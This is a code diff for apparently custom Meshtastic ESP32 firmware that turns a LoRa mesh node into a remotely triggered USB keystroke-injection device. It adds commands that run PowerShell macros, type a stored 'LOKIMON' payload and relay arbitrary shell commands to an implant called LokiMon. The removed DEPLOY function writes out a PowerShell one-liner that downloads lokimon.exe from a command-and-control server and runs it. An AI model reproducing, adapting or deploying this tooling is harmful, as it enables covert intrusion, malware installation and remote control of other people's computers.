@@ -1,10 +1,13 @@
 #include "HIDKeyboard.h"
+#include "macros/macro_psh.h"
+#include "macros/macro_psh_ele.h"
+#include "macros/macro_lokimon.h"
 #include "mesh/generated/meshtastic/mesh.pb.h"
-#include "mesh/MeshTypes.h"  // For isToUs() and isBroadcast()
+#include "mesh/MeshTypes.h"
 #include "Router.h"
 #include "MeshService.h"
 #ifdef ARCH_ESP32
-#include "tusb.h"  // For tud_mounted() to check USB host connection
+#include "tusb.h"
 #endif
 
 // Global USB HID objects
@@ -12,6 +15,25 @@ USBHIDKeyboard Keyboard;
 USBHIDVendor   VendorHID;
 
 HIDKeyboardModule *hidKeyboardModule;
+
+struct Macro {
+    const char *name;
+    const char *definition;
+};
+
+static const Macro macros[] = {
+    {"PSH",     MACRO_PSH},
+    {"PSH-ELE", MACRO_PSH_ELE},
+};
+
+struct Payload {
+    const char *name;
+    const char *content;
+};
+
+static const Payload payloads[] = {
+    {"LOKIMON", PAYLOAD_LOKIMON},
+};
 
 HIDKeyboardModule::HIDKeyboardModule() : MeshModule("HIDKeyboard")
 {
@@ -77,14 +99,7 @@ ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp
         return ProcessMessage::CONTINUE;
     }
 
-    bool isDirectMessage = isToUs(&mp);
-    bool isBroadcastMessage = isBroadcast(mp.to);
-
-    LOG_DEBUG("HID Keyboard: Message type - Direct: %d, Broadcast: %d, From: 0x%x, To: 0x%x",
-              isDirectMessage, isBroadcastMessage, mp.from, mp.to);
-
-    if (!isDirectMessage) {
-        LOG_DEBUG("HID Keyboard: Not a direct message, ignoring");
+    if (!isToUs(&mp)) {
         return ProcessMessage::CONTINUE;
     }
 
@@ -95,97 +110,100 @@ ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp
     messageUpper.toUpperCase();
     messageUpper.trim();
 
-    // PING — respond with PONG/NOPE
-    if (messageUpper == "PING") {
-        bool hostConnected = isReady() && isHostConnected();
-        const char *response = hostConnected ? "PONG" : "NOPE";
-        LOG_DEBUG("HID Keyboard: Received PING, responding with %s", response);
+    // --- Commands processed in both states ---
 
-        meshtastic_MeshPacket *p = router->allocForSending();
-        p->to = getFrom(&mp);
-        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
-        p->want_ack = false;
-        p->decoded.want_response = false;
-        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
-        memcpy(p->decoded.payload.bytes, response, strlen(response));
-        p->decoded.payload.size = strlen(response);
-        service->sendToMesh(p);
-
-        return ProcessMessage::CONTINUE;
-    }
-
-    // EXEC <cmd> — send command to LokiMon via LokiBridge
-    if (messageUpper.startsWith("EXEC ")) {
-        if (awaitingResponse) {
-            LOG_DEBUG("LokiBridge: EXEC discarded, previous command still pending");
-            return ProcessMessage::CONTINUE;
-        }
-        String shellCmd = message.substring(5);
-        shellCmd.trim();
-        LOG_DEBUG("LokiBridge: EXEC command received over LoRa from 0x%x: %s", mp.from, shellCmd.c_str());
-        lokiBridgeSender = mp.from;
-        sendLokiBridgeCmd(shellCmd.c_str());
-        awaitingResponse = true;
-        LOG_DEBUG("LokiBridge: Command sent to LokiMon, awaiting response");
-        return ProcessMessage::CONTINUE;
-    }
-
-    // LBRESET — reset LokiBridge link (unconditionally returns to IDLE)
+    // LBRESET — reset LokiBridge link and revert to LB_IDLE
     if (messageUpper == "LBRESET") {
-        LOG_DEBUG("LokiBridge: LBRESET command received over LoRa from 0x%x", mp.from);
+        LOG_DEBUG("LokiBridge: LBRESET from 0x%x", mp.from);
         chunkLen = 0;
         chunkCount = 0;
         messageInProgress = false;
         awaitingResponse = false;
+        shellActive = false;
         sendLokiBridgeReset();
-        LOG_DEBUG("LokiBridge: State cleared to IDLE, reset sent to LokiMon (best-effort)");
 
-        meshtastic_MeshPacket *p = router->allocForSending();
-        p->to = getFrom(&mp);
-        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
-        p->want_ack = false;
-        p->decoded.want_response = false;
-        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
-        const char *response = "LB IDLE";
-        memcpy(p->decoded.payload.bytes, response, strlen(response));
-        p->decoded.payload.size = strlen(response);
-        service->sendToMesh(p);
-
+        sendLoRaReply(mp, "LB IDLE");
         return ProcessMessage::CONTINUE;
     }
 
     // LBSTATUS — report LokiBridge status back over LoRa
     if (messageUpper == "LBSTATUS") {
-        LOG_DEBUG("LokiBridge: LBSTATUS command received over LoRa from 0x%x", mp.from);
         String status = getLokiBridgeStatus();
-
-        meshtastic_MeshPacket *p = router->allocForSending();
-        p->to = getFrom(&mp);
-        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
-        p->want_ack = false;
-        p->decoded.want_response = false;
-        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
-        memcpy(p->decoded.payload.bytes, status.c_str(), status.length());
-        p->decoded.payload.size = status.length();
-        service->sendToMesh(p);
-        LOG_DEBUG("LokiBridge: Status sent back over LoRa");
-
+        sendLoRaReply(mp, status.c_str());
         return ProcessMessage::CONTINUE;
     }
 
-    // PSH — open PowerShell on target
-    if (messageUpper == "PSH") {
-        LOG_DEBUG("HID Keyboard: PSH macro received over LoRa from 0x%x", mp.from);
-        executePSH();
+    // --- State transitions ---
+
+    // SHELL — enter LB_ACTIVE mode
+    if (messageUpper == "SHELL") {
+        if (!shellActive) {
+            LOG_DEBUG("LokiBridge: SHELL from 0x%x, entering LB_ACTIVE", mp.from);
+            shellActive = true;
+        }
+        sendLoRaReply(mp, "LB ACTIVE");
         return ProcessMessage::CONTINUE;
     }
 
-    // DEPLOY <c2-server> — download and run LokiMon
-    if (messageUpper.startsWith("DEPLOY ")) {
-        String c2Server = message.substring(7);
-        c2Server.trim();
-        LOG_DEBUG("HID Keyboard: DEPLOY macro received over LoRa from 0x%x, server: %s", mp.from, c2Server.c_str());
-        executeDeploy(c2Server);
+    // QUIT — revert to LB_IDLE mode
+    if (messageUpper == "QUIT") {
+        LOG_DEBUG("LokiBridge: QUIT from 0x%x, returning to LB_IDLE", mp.from);
+        shellActive = false;
+        awaitingResponse = false;
+        sendLoRaReply(mp, "LB IDLE");
+        return ProcessMessage::CONTINUE;
+    }
+
+    // --- LB_ACTIVE: forward everything to LokiBridge ---
+
+    if (shellActive) {
+        if (awaitingResponse) {
+            LOG_DEBUG("LokiBridge: Command discarded, previous still pending");
+            return ProcessMessage::CONTINUE;
+        }
+        LOG_DEBUG("LokiBridge: Forwarding to LokiMon: %s", message.c_str());
+        lokiBridgeSender = mp.from;
+        sendLokiBridgeCmd(message.c_str());
+        awaitingResponse = true;
+        return ProcessMessage::CONTINUE;
+    }
+
+    // --- LB_IDLE: normal command processing ---
+
+    // PING — respond with PONG/NOPE
+    if (messageUpper == "PING") {
+        bool hostConnected = isReady() && isHostConnected();
+        sendLoRaReply(mp, hostConnected ? "PONG" : "NOPE");
+        return ProcessMessage::CONTINUE;
+    }
+
+    // RUNM <name> — execute a named macro
+    if (messageUpper.startsWith("RUNM ")) {
+        String macroName = messageUpper.substring(5);
+        macroName.trim();
+        for (const auto &macro : macros) {
+            if (macroName == macro.name) {
+                LOG_DEBUG("HID Keyboard: RUNM '%s' from 0x%x", macro.name, mp.from);
+                executeLoKeyScript(String(macro.definition));
+                return ProcessMessage::CONTINUE;
+            }
+        }
+        LOG_DEBUG("HID Keyboard: Unknown macro '%s'", macroName.c_str());
+        return ProcessMessage::CONTINUE;
+    }
+
+    // LOAD <name> — type a payload line by line into the current shell
+    if (messageUpper.startsWith("LOAD ")) {
+        String payloadName = messageUpper.substring(5);
+        payloadName.trim();
+        for (const auto &payload : payloads) {
+            if (payloadName == payload.name) {
+                LOG_DEBUG("HID Keyboard: LOAD '%s' from 0x%x", payload.name, mp.from);
+                typePayload(payload.content);
+                return ProcessMessage::CONTINUE;
+            }
+        }
+        LOG_DEBUG("HID Keyboard: Unknown payload '%s'", payloadName.c_str());
         return ProcessMessage::CONTINUE;
     }
 
@@ -196,11 +214,10 @@ ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp
         messageUpper.startsWith("LEFT") || messageUpper.startsWith("RIGHT") ||
         messageUpper.startsWith("GUI ") || messageUpper.startsWith("ALT ") ||
         messageUpper.startsWith("CTRL ") || messageUpper.startsWith("DELAY ")) {
-        LOG_DEBUG("HID Keyboard: Detected LoKey Script format");
         String originalMessage = String((const char*)mp.decoded.payload.bytes, mp.decoded.payload.size);
         executeLoKeyScript(originalMessage);
     } else {
-        LOG_DEBUG("HID Keyboard: Not a recognized command, ignoring message");
+        sendLoRaReply(mp, "PING,GUI,ALT,CTRL,CTRL SHIFT,STRING,STRINGLN,ENTER,TAB,BACKSPACE,SPACE,LEFT,RIGHT,DELAY,RUNM,LOAD,SHELL,QUIT,LBSTATUS,LBRESET");
     }
 
     return ProcessMessage::CONTINUE;
@@ -211,8 +228,6 @@ ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp
 // ---------------------------------------------------------------------------
 void HIDKeyboardModule::lokiBridgeLoop()
 {
-    handleSerialLokiBridge();
-
     if (!awaitingResponse)
         return;
 
@@ -225,41 +240,6 @@ void HIDKeyboardModule::lokiBridgeLoop()
     }
 }
 
-// ---------------------------------------------------------------------------
-// Serial command handling for LBSTATUS and LBRESET
-// ---------------------------------------------------------------------------
-void HIDKeyboardModule::handleSerialLokiBridge()
-{
-    while (Serial.available()) {
-        char c = Serial.read();
-        if (c == '\n' || c == '\r') {
-            if (cmdBufPos > 0) {
-                cmdBuf[cmdBufPos] = '\0';
-                String cmd = String(cmdBuf);
-                cmd.trim();
-                cmd.toUpperCase();
-
-                if (cmd == "LBSTATUS") {
-                    String status = getLokiBridgeStatus();
-                    Serial.printf("[LB] %s\n", status.c_str());
-                }
-                else if (cmd == "LBRESET") {
-                    Serial.println("[LB] Resetting LokiBridge link...");
-                    chunkLen = 0;
-                    chunkCount = 0;
-                    messageInProgress = false;
-                    awaitingResponse = false;
-                    sendLokiBridgeReset();
-                    Serial.println("[LB] State cleared to IDLE, reset sent to LokiMon (best-effort)");
-                }
-
-                cmdBufPos = 0;
-            }
-        } else if (cmdBufPos < CMD_BUF_SIZE - 1) {
-            cmdBuf[cmdBufPos++] = c;
-        }
-    }
-}
 
 // ---------------------------------------------------------------------------
 // LokiBridge: send a command to LokiMon
@@ -351,7 +331,12 @@ void HIDKeyboardModule::processLokiBridgeReport(const uint8_t *buf)
         }
 
         case LB_CTRL_RESET:
-            LOG_DEBUG("LokiBridge: RESET ACK received, discarding");
+            LOG_DEBUG("LokiBridge: RESET received from LokiMon, returning to LB_IDLE");
+            awaitingResponse = false;
+            messageInProgress = false;
+            shellActive = false;
+            chunkLen = 0;
+            chunkCount = 0;
             break;
 
         default:
@@ -416,22 +401,61 @@ void HIDKeyboardModule::sendLoRaResponse(const char *text)
 }
 
 // ---------------------------------------------------------------------------
+// LokiBridge: send a reply to the sender of a LoRa packet
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::sendLoRaReply(const meshtastic_MeshPacket &mp, const char *text)
+{
+    meshtastic_MeshPacket *p = router->allocForSending();
+    p->to = getFrom(&mp);
+    p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
+    p->want_ack = false;
+    p->decoded.want_response = false;
+    p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
+    size_t len = strlen(text);
+    memcpy(p->decoded.payload.bytes, text, len);
+    p->decoded.payload.size = len;
+    service->sendToMesh(p);
+}
+
+// ---------------------------------------------------------------------------
 // LokiBridge: status string
 // ---------------------------------------------------------------------------
 String HIDKeyboardModule::getLokiBridgeStatus()
 {
-    if (!awaitingResponse)
-        return String("LB IDLE");
-    if (messageInProgress)
-        return String("LB AWAIT IN_PROG");
-    return String("LB AWAIT");
+    String state = shellActive ? "LB_ACTIVE" : "LB_IDLE";
+    if (awaitingResponse) {
+        state += messageInProgress ? " AWAIT IN_PROG" : " AWAIT";
+    }
+    return state;
 }
 
 // ---------------------------------------------------------------------------
-// Serial command handling for LBSTATUS and LBRESET
+// HID Keyboard: payload typing (LOAD command)
 // ---------------------------------------------------------------------------
-// Called from the serial console loop (main.cpp or SerialConsole)
-// This is checked in the main loop alongside lokiBridgeLoop()
+void HIDKeyboardModule::typePayload(const char *content)
+{
+    const char *p = content;
+    int lineNum = 0;
+
+    while (*p) {
+        const char *lineStart = p;
+        while (*p && *p != '\n') p++;
+
+        size_t lineLen = p - lineStart;
+        if (*p == '\n') p++;
+
+        if (lineLen == 0) {
+            Keyboard.println();
+        } else {
+            String line(lineStart, lineLen);
+            Keyboard.println(line);
+        }
+        lineNum++;
+        delay(50);
+    }
+
+    LOG_DEBUG("HID Keyboard: LOAD complete, typed %d lines", lineNum);
+}
 
 // ---------------------------------------------------------------------------
 // HID Keyboard: text and LoKey script execution
@@ -611,35 +635,6 @@ uint8_t HIDKeyboardModule::stringToKeyCode(const String &key)
 
     LOG_DEBUG("HID Keyboard: Unknown key: %s", key.c_str());
     return 0;
-}
-
-// ---------------------------------------------------------------------------
-// Macro: PSH — open a PowerShell prompt on the target
-// ---------------------------------------------------------------------------
-void HIDKeyboardModule::executePSH()
-{
-    LOG_DEBUG("HID Keyboard: Executing PSH macro");
-    pressKeyCombo(HID_KEY_GUI_LEFT, stringToKeyCode("r"));
-    delay(2000);
-    Keyboard.print("POWERSHELL.EXE");
-    delay(100);
-    pressEnter();
-    LOG_DEBUG("HID Keyboard: PSH macro complete");
-}
-
-// ---------------------------------------------------------------------------
-// Macro: DNLD — download and run LokiMon from a C2 server
-// ---------------------------------------------------------------------------
-void HIDKeyboardModule::executeDeploy(const String &c2Server)
-{
-    LOG_DEBUG("HID Keyboard: Executing DEPLOY macro, server: %s", c2Server.c_str());
-    String cmd = "$p=\"$env:TEMP\\lm.exe\"; Invoke-WebRequest -Uri http://";
-    cmd += c2Server;
-    cmd += "/lokimon.exe -OutFile $p; Start-Process $p";
-    Keyboard.print(cmd);
-    delay(100);
-    pressEnter();
-    LOG_DEBUG("HID Keyboard: DEPLOY macro complete");
 }
 
 void HIDKeyboardModule::pressKeyCombo(uint8_t modifier, uint8_t key)
